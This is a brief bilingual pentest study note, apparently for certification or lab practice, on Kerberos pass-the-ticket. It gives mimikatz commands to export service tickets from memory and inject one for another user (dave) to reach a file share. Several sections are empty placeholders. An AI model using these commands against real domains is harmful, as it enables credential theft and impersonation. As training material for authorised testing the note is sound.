
## DESCRIPTION

In the previous section, we used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.

#### Mas información
* 


## EXPLOITATION

### OPTION 1: DESDE KALI

En este ejemplo;



Desde mimikatz:

```
privilege::debug
sekurlsa::tickets /export
```



We can verify newly generated tickets with **dir**, filtering out on the **kirbi** extension.

```
dir *.kirbi
```

we can just pick any TGS ticket in the kirbi format and inject it through mimikatz via the kerberos::ptt command.

```
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```


Lo verificamos con klist 

y ya podríamos acceder al recurso compartido como el otro usuario en este ejemplo dave.
## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 